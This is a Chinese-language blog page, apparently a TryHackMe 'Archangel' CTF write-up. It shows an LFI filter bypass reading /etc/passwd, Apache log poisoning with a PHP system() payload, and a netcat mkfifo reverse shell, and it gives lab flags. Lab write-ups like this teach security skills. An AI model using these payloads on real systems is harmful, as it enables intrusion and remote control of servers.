@@ -1,0 +1,458 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TryHackMe_tomghost | X9wd09ncc</title><meta name="author" content="X9wd09ncc"><meta name="copyright" content="X9wd09ncc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Archangel Boot2root, Web exploitation, Privilege escalation, LFI  端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.48.128.224 22 SSH 10.48.128.224:22  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 0   2 10.48.12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TryHackMe_tomghost">
+<meta property="og:url" content="https://x9wd09ncc.github.io/post/TryHackMe_Archangel.html">
+<meta property="og:site_name" content="X9wd09ncc">
+<meta property="og:description" content="Archangel Boot2root, Web exploitation, Privilege escalation, LFI  端口扫描    序号 Host地址 端口 协议 Uri地址 标题 Banner 状态码    1 10.48.128.224 22 SSH 10.48.128.224:22  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 0   2 10.48.12">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg">
+<meta property="article:published_time" content="2026-05-15T09:44:20.000Z">
+<meta property="article:modified_time" content="2026-05-15T12:11:19.601Z">
+<meta property="article:author" content="X9wd09ncc">
+<meta property="article:tag" content="thm">
+<meta property="article:tag" content="easy">
+<meta property="article:tag" content="红队">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg"><link rel="shortcut icon" href="/img/favicon-32x32.png"><link rel="canonical" href="https://x9wd09ncc.github.io/post/TryHackMe_Archangel.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'TryHackMe_tomghost',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2026-05-15 20:11:19'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="X9wd09ncc" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = 'hidden';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+
+preloader.initLoading()
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wx3.sinaimg.cn/orj360/008sCc2Cgy1hdsg61ycohj30u00u0q59.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="X9wd09ncc"><span class="site-name">X9wd09ncc</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">TryHackMe_tomghost</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-15T09:44:20.000Z" title="发表于 2026-05-15 17:44:20">2026-05-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-05-15T12:11:19.601Z" title="更新于 2026-05-15 20:11:19">2026-05-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Archangel"><a href="#Archangel" class="headerlink" title="Archangel"></a>Archangel</h1><blockquote>
+<p>Boot2root, Web exploitation, Privilege escalation, LFI</p>
+</blockquote>
+<p>端口扫描</p>
+<table>
+<thead>
+<tr>
+<th align="center">序号</th>
+<th align="left">Host地址</th>
+<th align="center">端口</th>
+<th align="left">协议</th>
+<th align="left">Uri地址</th>
+<th align="left">标题</th>
+<th align="left">Banner</th>
+<th align="center">状态码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="left">10.48.128.224</td>
+<td align="center">22</td>
+<td align="left">SSH</td>
+<td align="left">10.48.128.224:22</td>
+<td align="left"></td>
+<td align="left">OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</td>
+<td align="center">0</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="left">10.48.128.224</td>
+<td align="center">80</td>
+<td align="left">HTTP</td>
+<td align="left"><a target="_blank" rel="noopener" href="http://10.48.128.224/">http://10.48.128.224:80</a></td>
+<td align="left">Wavefire</td>
+<td align="left">Apache-Web-Server, Apache&#x2F;2.4.29 (Ubuntu), Apache-HTTP-Server&#x2F;2.4.29, jQuery</td>
+<td align="center">200</td>
+</tr>
+</tbody></table>
+<p>在网站首页邮箱处找到一个 <code>hostname</code></p>
+<p><img src="/../image/TryHackMe/easy/Archangel/hostname.png"></p>
+<p>目录扫描</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# gobuster dir -u http:&#x2F;&#x2F;mafialive.thm -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt     
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+index.html           (Status: 200) [Size: 59]
+robots.txt           (Status: 200) [Size: 34]
+server-status        (Status: 403) [Size: 278]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>访问 <code>/robots.txt</code></p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# curl &quot;http:&#x2F;&#x2F;mafialive.thm&#x2F;robots.txt&quot;
+User-agent: *
+Disallow: &#x2F;test.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>访问 <code>/test.php</code>，有一个按钮</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# curl &quot;http:&#x2F;&#x2F;mafialive.thm&#x2F;test.php&quot;
+
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;title&gt;INCLUDE&lt;&#x2F;title&gt;
+    &lt;h1&gt;Test Page. Not to be Deployed&lt;&#x2F;h1&gt;
+ 
+    &lt;&#x2F;button&gt;&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;&#x2F;test.php?view&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;mrrobot.php&quot;&gt;&lt;button id&#x3D;&quot;secret&quot;&gt;Here is a button&lt;&#x2F;button&gt;&lt;&#x2F;a&gt;&lt;br&gt;
+            &lt;&#x2F;div&gt;
+&lt;&#x2F;body&gt;
+
+&lt;&#x2F;html&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>浏览器访问并点击按钮</p>
+<p>注意到参数 <code>view </code>后面跟的是目录，猜测存在目录遍历漏洞</p>
+<p><img src="/../image/TryHackMe/easy/Archangel/test.png"></p>
+<p>将 <code>mrrobot.php</code> 修改为 <code>robots.txt</code>，返回结果里面输出了该路径的内容</p>
+<pre class="line-numbers language-none"><code class="language-none">──(root㉿kali)-[~&#x2F;桌面]
+└─# curl &quot;http:&#x2F;&#x2F;mafialive.thm&#x2F;test.php?view&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;robots.txt&quot;
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;INCLUDE&lt;&#x2F;title&gt;
+    &lt;h1&gt;Test Page. Not to be Deployed&lt;&#x2F;h1&gt;
+    &lt;&#x2F;button&gt;&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;&#x2F;test.php?view&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;mrrobot.php&quot;&gt;&lt;button id&#x3D;&quot;secret&quot;&gt;Here is a button&lt;&#x2F;button&gt;&lt;&#x2F;a&gt;&lt;br&gt;
+        User-agent: *
+Disallow: &#x2F;test.php
+    &lt;&#x2F;div&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>修改为 <code>test.php</code> 无结果</p>
+<pre class="line-numbers language-none"><code class="language-none">root㉿kali)-[~&#x2F;桌面]
+└─# curl &quot;http:&#x2F;&#x2F;mafialive.thm&#x2F;test.php?view&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;test.php&quot;
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;INCLUDE&lt;&#x2F;title&gt;
+    &lt;h1&gt;Test Page. Not to be Deployed&lt;&#x2F;h1&gt;
+    &lt;&#x2F;button&gt;&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;&#x2F;test.php?view&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;mrrobot.php&quot;&gt;&lt;button id&#x3D;&quot;secret&quot;&gt;Here is a button&lt;&#x2F;button&gt;&lt;&#x2F;a&gt;&lt;br&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用 <code>base64</code> 去解析，返回了文件的编码结果</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# curl &quot;http:&#x2F;&#x2F;mafialive.thm&#x2F;test.php?view&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;test.php&quot;
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;INCLUDE&lt;&#x2F;title&gt;
+    &lt;h1&gt;Test Page. Not to be Deployed&lt;&#x2F;h1&gt;
+ 
+    &lt;&#x2F;button&gt;&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;&#x2F;test.php?view&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;mrrobot.php&quot;&gt;&lt;button id&#x3D;&quot;secret&quot;&gt;Here is a button&lt;&#x2F;button&gt;&lt;&#x2F;a&gt;&lt;br&gt;    CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw&#x2F;cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg&#x3D;&#x3D;    &lt;&#x2F;div&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>解码</p>
+<p>限制条件</p>
+<blockquote>
+<p>不能包含 ..&#x2F;..（防止路径向上跳转）</p>
+<p>必须包含 &#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing（强制从该目录开始）</p>
+</blockquote>
+<p>虽然不能有 <code>../..</code>，但是 <code>..</code> 本身是允许的，因此可以用双斜杠 <code>..//..</code> 绕过</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">HTML</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>INCLUDE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Test Page. Not to be Deployed<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test.php?view=/var/www/html/development_testing/mrrobot.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>secret<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Here is a button<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
+        <span class="token prolog">&lt;?php
+            //FLAG: thm&#123;explo1t1ng_lf1&#125;
+            function containsStr($str, $substr) &#123;
+                return strpos($str, $substr) !== false;
+            &#125;
+            if(isset($_GET["view"]))&#123;
+            if(!containsStr($_GET['view'], '../..') &amp;&amp; containsStr($_GET['view'], '/var/www/html/development_testing')) &#123;
+                include $_GET['view'];
+            &#125;else&#123;
+                echo 'Sorry, Thats not allowed';
+            &#125;
+        &#125;
+        ?></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>尝试目录遍历，成功返回了 <code>/etc/passwd</code> 的内容</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# curl &quot;http:&#x2F;&#x2F;mafialive.thm&#x2F;test.php?view&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;..&#x2F;&#x2F;.&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;etc&#x2F;passwd&quot;
+
+&lt;!DOCTYPE HTML&gt;
+&lt;html&gt;
+
+&lt;head&gt;
+    &lt;title&gt;INCLUDE&lt;&#x2F;title&gt;
+    &lt;h1&gt;Test Page. Not to be Deployed&lt;&#x2F;h1&gt;
+ 
+    &lt;&#x2F;button&gt;&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;&#x2F;test.php?view&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;mrrobot.php&quot;&gt;&lt;button id&#x3D;&quot;secret&quot;&gt;Here is a button&lt;&#x2F;button&gt;&lt;&#x2F;a&gt;&lt;br&gt;
+        root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
+daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+...
+&lt;&#x2F;body&gt;
+
+&lt;&#x2F;html&gt;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>尝试遍历阿帕奇的日志文件，也是成功</p>
+<pre class="line-numbers language-none"><code class="language-none">view&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>修改 <code>User-Agent</code> 参数来污染日志文件</p>
+<pre class="line-numbers language-none"><code class="language-none">curl -A &quot;&lt;?php system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot; &quot;http:&#x2F;&#x2F;mafialive.thm&#x2F;test.php?view&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后再执行 <code>cmd</code> 命令，将结果输出到 <code>log.txt</code></p>
+<pre class="line-numbers language-none"><code class="language-none">curl &quot;http:&#x2F;&#x2F;mafialive.thm&#x2F;test.phpview&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;development_testing&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;&#x2F;..&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log&amp;cmd&#x3D;id&quot; -o log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查看日志文件，在最后找到了 <code>id</code> 的执行结果</p>
+<p><img src="/../image/TryHackMe/easy/Archangel/log.png"></p>
+<p>那就直接反弹 <code>shell</code></p>
+<pre class="line-numbers language-none"><code class="language-none">-A &quot;&lt;?php exec(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.206.169 4444 &gt;&#x2F;tmp&#x2F;f&#39;) ?&gt;&quot; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>成功反弹</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[~&#x2F;桌面]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.80.128] from (UNKNOWN) [192.168.80.1] 10299
+&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)
+$ ls &#x2F;home
+archangel
+$ cd &#x2F;home&#x2F;archangel
+$ ls -al
+total 44
+drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
+drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
+-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
+-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
+drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
+drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
+-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
+-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
+drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
+drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
+-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt
+$ cat user.txt
+thm&#123;lf1_t0_rc3_1s_tr1cky&#125;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
